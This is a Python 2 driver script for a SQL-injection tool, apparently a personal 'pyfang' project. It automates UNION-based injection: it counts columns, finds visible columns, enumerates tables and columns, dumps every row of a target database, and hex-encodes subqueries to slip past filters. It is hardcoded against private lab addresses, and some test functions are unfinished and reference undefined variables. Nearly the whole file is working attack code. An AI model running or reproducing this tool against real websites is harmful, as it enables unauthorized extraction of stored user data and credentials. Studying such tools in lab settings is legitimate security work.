#!/usr/bin/python
""" Driver program for pyinject. Handles user-defined options and calls appropriate modules.

    OPTIONS to support:
        -f:     \n-delimited text file of parameters to inject (default is mysql_params).
        -d:     Delimiter to use. Default is '/**/', also can use:
                                             '%20' 
        -db:    Database to try injections against (default is MySQL). Only MySQL supported as of now.
        -v:     Verbose mode.
"""

import os, sys, urllib2
import builder, datastore, injector, scanner, obfuscator, parser, reporter
import md5
import pprint
import json

def startup(page, param_string):
    """ Handles startup of script, flags, etc.
        :page:          String. URL before querystring.
        :param_string:  String. URL querystring.
        :returns:       String. Page ready for sqli manipulation.
    """
    params = {i.split('=')[0]:i.split('=')[1]  for i in param_string.split('&')}

    # Get SQLi vulnerable param.
    sqli_vulnerable_param = sys.argv[2][len('sqli='):]

    # Construct basic page format for sqli
    sqli = page + '?' 
    if len(params) > 1:
        sqli += "&".join([p + '=' + params[p] for p in params if p != sqli_vulnerable_param])
        sqli += '&' + sqli_vulnerable_param + '=' + params[sqli_vulnerable_param]
    else: # only one param
        sqli += sqli_vulnerable_param + '=' + params[sqli_vulnerable_param]

    return sqli 

def num_columns(page, verbose):
    # Get column data for union statement
    
    fang = injector.Injector(page, '')
    num_columns = fang.get_num_columns() 

    if verbose:
        reporter.Reporter().columns_in_statement(num_columns)

    return num_columns

def magic_num(page, verbose):

    fang = injector.Injector(page, '')
    magic_num = int(fang.get_visible_param())

    if verbose:
        reporter.Reporter().magic_number(magic_num)

    return magic_num

def visible_nums(page, num_cols, verbose):
    """
        :page:
        :num_cols:
        :verbose:   If True, prints extra information to screen.
        :returns:   List of numbers visible on page after UNION SELECT query.
    """
    build = builder.Builder(page, [])
    store = datastore.Store()
    parse = parser.Parser(store)
    scan = scanner.Scanner()

    null_page = scan.page(build.null_page())
    union_nums = scan.page(build.union_nums(num_cols))
    visible_nums = parse.get_visible_nums(parse.html_diff(null_page, union_nums))

    if verbose:
        report = reporter.Reporter()

    return visible_nums

def union_queries(page, query_params, num_cols, visible_nums, verbose):
    """
        :query_params: List of strings. Database-specific parameters to search for.
    """

    build = builder.Builder(page, query_params)
    fang = injector.Injector(page, '')

    queries = build.union(num_cols, visible_nums)
    results = fang.injection(queries)

    if verbose:
        report = reporter.Reporter()
        report.db_info(results)

    return results

def tables(page, num_cols, visible_num, verbose):

    query = builder.Builder(page, []).tables(num_cols, visible_num)
    tables = injector.Injector(page, '').injection(query)
    store = datastore.Store()
    results = parser.Parser(store).tables(tables)

    if verbose:
        report = reporter.Reporter()
        report.tables(results)

    return results

def columns(page, table, num_cols, visible_num, verbose):
    """
        :returns: List of columns in table.
    """

    query = builder.Builder(page, []).columns(table, num_cols, visible_num)
    columns = injector.Injector(page, '').injection(query)
    store = datastore.Store()
    results = parser.Parser(store).columns(columns)

    if verbose:
        report = reporter.Reporter()
        report.columns(results)

    return results

def rows(page, table, column, num_cols, visible_num, verbose):

    query = builder.Builder(page, []).rows(table, column, num_cols, visible_num)
    rows = injector.Injector(page, '').injection(query)
    store = datastore.Store()
    results = parser.Parser(store).rows(rows)

    if verbose:
        report = reporter.Reporter()
        report.rows(results)

    return results

def dump_table(page, table, num_cols, visible_num, verbose):
    """
        :returns: Dict of Lists. Column->rows.
    """

    results = {}

    num_rows = 0
    for column in columns(page, table, num_cols, visible_num, False):
        r = rows(page, table, column, num_cols, visible_num, False)
        if len(r) > num_rows:
            num_rows = len(r)
        results[column] = r

    if verbose:
        print 'Table:', table

        for r in results:
            print r, '\t',
        print 

        for i in xrange(0, num_rows):
            for r in results:
                try:
                    print results[r][i],
                except IndexError:
                    print 'XXX',

    return results

def dump_database(page, num_cols, visible_num, verbose):
    """ Dumps all database info for a vulnerable page.
        :page:          String. Valid URL for vulnerable page.
        :num_cols:      Int. Number of columns in UNION statement.
        :visible_num:   Int. Number of most visible column in UNION statment.
        :verbose:       Bool. Whether to print additional info or not.
        :returns:       Dict of dict of lists. 1st key is table names.
                        2nd key is column names->list containing rows of data.
    """

    results = {}
    t = tables(page, num_cols, visible_num, False)
    for table in t:
        results[table] = dump_table(page, table, num_cols, visible_num, verbose)

    return results


def obfuscate_subquery(obfuscator, obfuscation, subquery):
    """ Takes subquery to obfuscate by encoding.
        :obfuscator:    Obfuscator object.
        :obfuscation:   Type of obfuscation to use. Ex, hex-encoding.
        :subquery:      String. Part of query to encode.
        :returns:       String. Encoded subquery.
    """
    
    return obfuscator.by_encoding(subquery, obfuscation)

def test_obfuscation():
    # Example obfuscation
    hexencoded = '1 union select column_name,2 from information_schema.columns where table_name = (select'
    hexencoded += obfuscate_subquery(obfuscate, 'hex', '\'users\'') + ')'
    print hexencoded

def test_pwn(num_columns, magic_num):
    # Get DB params
    print '\n### Basic DB Info ###'
    db_data = fang.injection(build.union(num_columns, magic_num)) 
    report.db_info(parse.params(db_data))

    # Get tables
    print '### Interesting Tables ###'
    tables = fang.injection(build.tables(num_columns, magic_num)) 
    report.tables(parse.tables(tables))

    # Get columns, one table at a time
    print '\n### DB Table Columns ###'
    columns = fang.injection(build.columns(num_columns, magic_num, tables['table_name'])) 
    report.columns(parse.columns(columns))
    columns = parse.columns(columns)

    # Get rows
    for column in columns:
        x = build.rows(num_columns, magic_num, data)
        print x
    data = fang.injection(x)
    print data
    print parse.rows(data)
    #report.XXX(parse.XXX(data))

if __name__ == '__main__':

    if len(sys.argv) == 1:
        print 'Currently pyfang supports:'
        print 'python pyfang page="[url]" sqli="[vulnerable param]"'
        sys.exit(0)

    # whitespace-delimited file
    mysql_params = open('./lists/mysql/basic_union.txt').read().split()
    #config = open('./configs/mysql/php/query_configs.txt').readlines()

    # Get page and dict of param => value
    #url = sys.argv[1][len('page='):] # Weird. Should be changed later.
    #page_id, param_string = tuple(url.split('?'))

    #page = startup(page_id, param_string)
    #print '\n\n'
    #print page

    # Currently handling whether string or int here, need to find place for it.
    #if len(sys.argv) > 3 and sys.argv[3] == 'string':
    #    page = page[:-1] + "'" + page[-1]

    
    #page = 'http://192.168.83.134/index.php?id=1'
    page = 'http://192.168.83.130/cat.php?id=1'

    # Get number of columns and which column to use for injection.
    num_cols = num_columns(page, False)
    visible_num = int(visible_nums(page, num_cols, False)[0])

    dump_database(page, num_cols, visible_num, True)

    """
    x = build.comparative_precomputation()
    my_dict = fang.pre_comp_injection(x)

    store.create_lookup(my_dict)
    print store.lookup_table
    """


